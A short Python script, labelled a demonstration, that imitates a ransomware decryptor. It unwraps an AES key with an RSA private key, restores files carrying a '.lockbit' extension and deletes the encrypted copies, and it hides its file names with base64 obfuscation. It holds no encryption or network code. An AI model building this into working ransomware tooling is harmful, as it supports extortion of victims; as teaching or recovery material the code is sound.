import os
from base64 import b64decode
from cryptography.hazmat.primitives.asymmetric import padding
from cryptography.hazmat.primitives import serialization, hashes
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
from cryptography.hazmat.primitives import padding as sym_padding
from cryptography.hazmat.backends import default_backend

# Obfuscated strings for file names
PRIVATE_KEY_FILE = b64decode('cHJpdmF0ZV9rZXkucGVt').decode('utf-8')
ENCRYPTED_AES_KEY_FILE = b64decode('ZW5jcnlwdGVkX2Flc19rZXkuYmlu').decode('utf-8')
ENCRYPTED_FILE_EXTENSION = b64decode('bG9ja2JpdA==').decode('utf-8')


# Load RSA private key
def load_private_key():
    with open(PRIVATE_KEY_FILE, "rb") as key_file:
        private_key = serialization.load_pem_private_key(
            key_file.read(),
            password=None,
            backend=default_backend()
        )
    return private_key


# Decrypt AES key with RSA
def decrypt_aes_key(encrypted_aes_key, private_key):
    aes_key = private_key.decrypt(
        encrypted_aes_key,
        padding.OAEP(
            mgf=padding.MGF1(algorithm=hashes.SHA256()),
            algorithm=hashes.SHA256(),
            label=None
        )
    )
    return aes_key


# Decrypt files with AES
def decrypt_files(files, aes_key):
    for file in files:
        original_file = file.replace(f'.{ENCRYPTED_FILE_EXTENSION}', '')
        with open(file, "rb") as f:
            iv = f.read(16)  # Read the IV from the beginning
            encrypted_data = f.read()

        cipher = Cipher(algorithms.AES(aes_key), modes.CBC(iv), backend=default_backend())
        decryptor = cipher.decryptor()
        unpadder = sym_padding.PKCS7(algorithms.AES.block_size).unpadder()

        padded_data = decryptor.update(encrypted_data) + decryptor.finalize()
        data = unpadder.update(padded_data) + unpadder.finalize()

        with open(original_file, "wb") as f:
            f.write(data)

        os.remove(file)  # Remove the encrypted file


# Function to simulate decryption (for demonstration purposes)
def decrypt_simulation(target_files):
    # Load RSA private key
    private_key = load_private_key()

    # Load and decrypt the AES key
    with open(ENCRYPTED_AES_KEY_FILE, "rb") as key_file:
        encrypted_aes_key = key_file.read()
    aes_key = decrypt_aes_key(encrypted_aes_key, private_key)

    # Decrypt the files
    decrypt_files(target_files, aes_key)
    print("Files decrypted and restored to original names:")
    for file in target_files:
        print(file.replace(f'.{ENCRYPTED_FILE_EXTENSION}', ''))


# List of files to decrypt (for demonstration purposes)
target_files = ["file1.txt.lockbit", "file2.txt.lockbit", "file3.txt.lockbit"]

# Simulate decryption
decrypt_simulation(target_files)
